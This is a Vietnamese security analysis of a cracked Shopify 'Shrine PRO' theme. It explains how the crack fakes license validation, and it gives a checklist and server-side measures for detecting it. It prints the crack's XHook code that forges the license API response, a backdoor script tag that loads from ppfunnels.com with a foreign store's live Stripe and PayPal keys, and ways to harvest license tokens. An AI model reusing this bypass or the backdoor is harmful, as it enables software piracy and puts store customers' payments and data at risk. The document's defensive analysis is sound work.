# Phân tích cơ chế crack Shrine PRO Theme

## Tổng quan

Bản crack hoạt động theo **Cách 2: XHook API Intercept** — không chỉnh sửa file bảo vệ gốc, thay vào đó monkey-patch JavaScript runtime để fake response từ server validation.

---

## Các thành phần của cơ chế crack

### Mảnh 1 — Backdoor injection
**File:** `layout/theme.liquid` dòng 32
```liquid
{% include 'itc-bootstrap' %}
```
**File:** `snippets/itc-bootstrap.liquid`
```html
<script src="https://www.ppfunnels.com/assets/pb/
  steve-de-canada19.myshopify.com/bootstrap.js
  ?stripe_wallets_publishable_key=pk_live_51NOY2U...
  &paypal_client_id=ARNO5Urtkwk...">
</script>
```
- Inject credentials Stripe LIVE + PayPal của store `steve-de-canada19.myshopify.com`
- Script load từ server ngoài, có thể thay đổi nội dung bất kỳ lúc nào (persistent backdoor)

---

### Mảnh 2 — XHook loader
**File:** `layout/theme.liquid` dòng 39
```html
<script src="//unpkg.com/xhook@latest/dist/xhook.min.js"></script>
```
- Load thư viện monkey-patch toàn bộ `XMLHttpRequest` và `fetch` trong browser

---

### Mảnh 3 — API response intercept
**File:** `layout/theme.liquid` dòng 40–46
```javascript
xhook.after(function (request, response) {
  if (request.url == "https://dashboard.shrinetheme.com/api/updates/check")
    response.json = {"success": true}
});
```
- Chặn response từ endpoint validate license
- Replace bằng `{"success": true}` bất kể server thật trả về gì

---

### Mảnh 4 — Script URL bị đổi path
```
Bản gốc:   https://js.shrinetheme.com/js/v2/main.js?version=1
Bản crack:  https://js.shrinetheme.com/main.js?version=1
```
- Thiếu `/js/v2/` — trỏ sang endpoint khác có thể ít kiểm tra domain hơn

---

### Mảnh 5 — preconnect bị đổi
```
Bản gốc:   <link rel="preconnect" href="https://js.shrinetheme.com">
Bản crack:  <link rel="preconnect" href="https://dashboard.shrinetheme.com">
```
- Pre-resolve đúng domain mà XHook sẽ intercept

---

## Luồng hoạt động hoàn chỉnh

```
Browser load trang
        │
        ▼
[1] itc-bootstrap.liquid chạy
    → inject ppfunnels.com script (backdoor)
        │
        ▼
[2] xhook.min.js load
    → hook vào XMLHttpRequest & fetch toàn trang
        │
        ▼
[3] xhook.after() đăng ký rule:
    "nếu request đến dashboard.shrinetheme.com/api/updates/check
     → thay response thành {success:true}"
        │
        ▼
[4] js.shrinetheme.com/main.js load
    → đọc token từ data-animations-type
    → gọi dashboard.shrinetheme.com/api/updates/check
        │
        ▼
[5] XHook chặn response
    → trả {success:true} về cho script Shrine
    → script không biết bị lừa
        │
        ▼
[6] Script override formatDates()
    → cart hoạt động bình thường
    → CSS visibility:hidden không kích hoạt
        │
        ▼
[7] Theme chạy đầy đủ trên domain không có license
```

---

## Tại sao token thật không phải điều kiện bắt buộc

| Lớp bảo vệ | Xử lý bởi | Cần token thật? |
|---|---|---|
| Liquid CSS check (`size < 196`) | Shopify server-side render | Chỉ cần ≥ 196 ký tự bất kỳ |
| API validation (`/api/updates/check`) | XHook fake response | Không cần |
| `formatDates()` time-bomb | Script Shrine override sau khi API pass | Không cần |

→ **Kết luận:** Token thật trong bản crack này là do copy nguyên xi từ theme export của pugomark.com — không phải yêu cầu kỹ thuật bắt buộc.

---

## Rủi ro bảo mật với store bị cài bản crack này

| Rủi ro | Cơ chế |
|---|---|
| Thanh toán Apple Pay / Google Pay gắn nhầm Stripe account | `pk_live_51NOY2U...` của store lạ |
| Dữ liệu khách hàng bị thu thập | `ppfunnels.com/bootstrap.js` có full DOM access |
| Remote code execution | Chủ `ppfunnels.com` có thể đổi nội dung script bất kỳ lúc nào |
| PayPal transaction bị attribute nhầm | PayPal Client ID của `steve-de-canada19` |
| Pháp lý | Store owner chịu trách nhiệm nếu khách hàng bị thiệt hại |

---

## Checklist kiểm tra theme đang chạy

Mở source code theme đang active trên Shopify Admin, kiểm tra từng mục:

```
□ 1. Tìm "xhook" trong toàn bộ .liquid files
      → Có = XHook đang được inject

□ 2. Tìm "itc-bootstrap" trong layout/theme.liquid
      → Có = snippet lạ đang được include

□ 3. Tìm "ppfunnels.com" trong toàn bộ snippets/
      → Có = backdoor thanh toán đang chạy

□ 4. Kiểm tra <link rel="preconnect"> trong <head> của theme.liquid
      → Đúng:  js.shrinetheme.com
      → Sai:   dashboard.shrinetheme.com  ← dấu hiệu bản crack

□ 5. Kiểm tra URL của Shrine script
      → Đúng:  /js/v2/main.js?version=1
      → Sai:   /main.js?version=1  (thiếu /js/v2/)  ← dấu hiệu bản crack

□ 6. Tìm "unpkg.com" trong theme.liquid
      → Có = thư viện ngoài đang được load

□ 7. Kiểm tra settings_data.json: giá trị "animations_type"
      → Nếu trùng với token của store khác = token bị đánh cắp và phân phối lại
```

**Kết quả:** Bất kỳ checkbox nào được tick = theme đã bị can thiệp.

---

## Cách detect từ phía server (Shrine có thể implement)

1. **Token dùng trên nhiều domain** — log domain per token, alert khi cùng token xuất hiện từ domain lạ
2. **Cryptographic response signing** — thêm HMAC vào response, client verify trước khi tin → XHook không thể forge
3. **Native code fingerprint** — script tự kiểm tra `XMLHttpRequest.prototype.open.toString()` có phải `[native code]` không

---

## So sánh bản gốc vs bản crack

| | Bản gốc (pugomark.com) | Bản crack (maybe_crack) |
|---|---|---|
| `preconnect` | `js.shrinetheme.com` | `dashboard.shrinetheme.com` |
| Script path | `/js/v2/main.js?version=1` | `/main.js?version=1` |
| XHook | Không có | Có (`unpkg.com/xhook`) |
| `itc-bootstrap` snippet | Không có | Có |
| `ppfunnels.com` | Không có | Có (backdoor) |
| `nvcart.com` | Có | Không có |
| Token | Thật của pugomark.com | Token khác (408 vs 428 ký tự) |

---

## Cơ chế lấy token để crack

### Token có public không?

Token được Liquid render thẳng vào HTML trả về browser:

```html
<script src="https://js.shrinetheme.com/main.js?version=1"
  data-animations-type="AegJ3bpAkfk+lEfwcFCCcdIXjCk58Iex...BA==">
</script>
```

**Bất kỳ ai View Source trên store đang chạy đều thấy token này.** Không cần quyền truy cập đặc biệt.

---

### Các nguồn có thể lấy token

| Nguồn | Cách lấy | Khả năng |
|---|---|---|
| **Tự mua license** | Mua 1 bản hợp lệ → lấy token từ `settings_data.json` của store mình → nhúng vào bản crack phát tán | Cao nhất |
| **View Source store đang chạy** | Token render thành plaintext trong HTML → copy từ `data-animations-type` | Hoàn toàn có thể |
| **File export bị share** | Chủ store share `.zip` theme export lên group/forum → file chứa `settings_data.json` kèm token nguyên vẹn | Có thể |
| **Collaborator/Partner access** | Từng được cấp quyền Shopify Collaborator → download theme export từ Admin | Có thể |
| **Dịch vụ clone/migrate store** | Dùng dịch vụ không tin cậy → file export bị giữ lại | Có thể |

---

### Kết quả so sánh token pugomark.com vs maybe_crack

```
Original (pugomark.com):  408 ký tự — AegJ3bpAkfk+lEfwcFCC...BeSonVCSRIahbro7BA==
maybe_crack:              428 ký tự — 6CpgzBNae/07RpqEZIE+M...WfNdaGgWfMT5FihaO8I=
Trùng nhau: KHÔNG
```

Token trong bản crack **không phải của pugomark.com** — là token của store khác, nhiều khả năng là store kẻ crack tự mua license.

---

### Tại sao token visible trong HTML là điểm yếu căn bản

```
Mục đích token:      xác thực domain đã mua license
Thực tế:             token render ra HTML → ai cũng thấy
Hệ quả:              lấy token + XHook = bypass hoàn toàn trên domain khác
Giải pháp duy nhất:  server phải verify domain kèm token, không chỉ verify token
```
